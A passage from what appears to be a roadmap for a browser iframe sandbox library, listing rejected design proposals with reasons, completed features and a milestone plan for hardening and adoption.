[ADR-001](ADR-001-continue-or-adopt.md); note this is *not* the unique-origin model, which is a
downgrade on the origin axis); and
a **logic tier evaluation** (upgraded from a speculative spike): as of the
[2026-08 field scan](ADR-001-continue-or-adopt.md#field-scan--august-2026) this is a solved,
MIT-licensed commodity — evaluate [`vercel-labs/quickjs-wasi`](https://github.com/vercel-labs/quickjs-wasi)
(VM snapshot/restore, which also serves B2's `reset()`) and `@tanstack/ai-isolate-quickjs`, with
[`reearth/zushi`](https://github.com/reearth/zushi) as the reference for how a QuickJS logic tier
meets an opaque-origin UI tier. Do not write a JS engine.

---

## Rejected / Out of Scope

| Proposal | Source | Why not |
| :--- | :--- | :--- |
| Wildcard DNS + SSL as the **default** | `cross-origin-html-embed` | Destroys the local-first property, the one thing no competitor offers. Opt-in only. |
| Iframe-scoped Service Worker ("hub" model) | Considered internally | Needs a sandbox origin that can register SWs, re-opening privilege escalation. See [`ARCHITECTURE_COMPARISON.md`](research/ARCHITECTURE_COMPARISON.md). |
| Service-Worker VFS (host-level hub) | The original virtual-files design | Never served a file: the opaque-origin `srcdoc` guest is never a client of any Service Worker. The worker was also served as untranspiled TypeScript, partitioned as a third-party iframe, and lost files sent before it loaded. Replaced by guest-realm blob URLs, [ADR-004](ADR-004-files-as-blob-urls.md). |
| Service Worker update integrity (was C4) | [`SW-verify-before-update.md`](research/SW-verify-before-update.md) | No Service Worker is left to protect (ADR-004). |
| `allow-same-origin` for API compatibility | `websandbox` | Root cause of findings 01, 02 and 05. Enforced by T2's deny-list test. |
| Agent runtime in the trusted base | [`RESEARCH_SANDBOXING.md`](research/RESEARCH_SANDBOXING.md) | Keep the base dumb; agents load as user code so their bugs stay inside the sandbox. |
| BrowserPod / CheerpX as a dependency | [2026-08 field scan](ADR-001-continue-or-adopt.md#field-scan--august-2026) | Proprietary licence — free only for personal and open-source use. Disqualified as a dependency. |
| Building a full OS / Linux tier | Same | BrowserPod and `lifo` are years ahead, and it is not this project's problem. |
| Writing our own JS engine / VM tier | Same | `quickjs-wasi` and `@tanstack/ai-isolate-quickjs` are MIT and maintained. Adopt, don't build. |
| Nonce-based CSP instead of `'unsafe-inline'` | General best practice | No benefit under an opaque origin with immutable `srcdoc` CSP — [`CSP_CONFIG_RATIONALE.md`](CSP_CONFIG_RATIONALE.md) §3. |
| App identity from a hash of the source | [Lunet](https://gozala.io/lunet) | The embedder already knows what it loaded; two tenants with identical code would share storage, and any edit loses the data. If storage needs scoping, the embedder passes a namespace. |
| Declarative argument rules per method (UCAN policy) | [Dialog DB](https://github.com/dialog-db/dialog-db) | In UCAN a third party writes the policy; here the embedder writes both policy and handler, so checking arguments in code is strictly more expressive. |
| Method-first names so read-only is a prefix | Dialog DB | There are no grants to narrow; an exposed name is the whole grant. |
| UCAN delegation between host and guest | Dialog DB | One host, one guest, no third party: holding the one-shot port already is the authority. Would add keys, signatures and a clock to a self-contained broker. |
| React/Vue adapters (was part of D3) | Backlog D3 | Owner's decision: a custom element already works in every framework, and wrappers would be a second API surface to keep in step with the element. |
| Server-side session quotas (rate limit, TTL, LRU) | [Finding 08](research/08_session_exhaustion/README.md), `IMPROVEMENTS.md` §1 | The local-first architecture has no server. Becomes P1 the moment a hosted mode ships; recorded so the requirement is not lost with the server that was removed. |

---

## Already Done

So `IMPROVEMENTS.md` is not re-proposed wholesale:

- **`MessageChannel` communication** (§3) — `setupChannel()` (`src/host.ts:150`), both modes.
- **Promise-based RPC, both directions** — `src/lib/rpc.ts` over the same channel, both modes (B1).
- **CSP generation from typed config** — `src/lib/csp/csp-generator.ts`, hardened with a
  `default-src 'none'` fallback and 12 passing unit tests.
- **Opaque origin via `srcdoc`** — closes findings 03 and 05 by construction.
- **Headless worker mode** — isolated inside the sandbox frame since S1.
- **Lifecycle state machine** (§4) — `state`, `terminate()` and `reset()` on the element, without
  the XState dependency (B2).
- **Virtual files** — guest-realm blob URLs through `sandboxFiles`, both modes, named from markup,
  modules, stylesheets and `srcset` (C1–C3, ADR-004).

---

## Suggested Order

| Milestone | Items | Why in this order |
| :--- | :--- | :--- |
| **M1 · Turn the lights on** | T1, T2, T3, D2 | Until the suite runs, no security claim is verified and no later change is safe. CI belongs here so the same drift cannot recur. |
| **M2 · Make the claims true** | S1, S2, S7, S9, D1, B3, B4 | A documented capability that does not hold (S1) or does not install (D1) costs more than a missing one. B3/B4 ride along — DevTools is silent and the element self-registers nowhere. |
| **M3 · Harden** | S3, S4, S13, S15, S16, T4, T5, H3 | The injection path and the session-id model are the two places where the design's assumptions are unverified; presets and type checking keep them that way. S13 is a candidate egress route that CSP does not cover. S15 leaks the host page's URL to the guest; S16 lets a config meant to deny widen the policy. |
| **M4 · Make it adoptable** | B1, B7, B2, C1, C2 | RPC + lifecycle is the parity bar set by websandbox and Penpal; B7 makes RPC failures safe to branch on; the VFS is the differentiator, so it must actually work. |
| **M5 · Extend** | B5, B6, C3, C5, S5, S6, D3, H1, H2, H5 | Observability, quotas, docs and hygiene once the base is trustworthy. |
| **Bets** | hosted-origin mode, QuickJS spike | Independent; run when there is slack. |
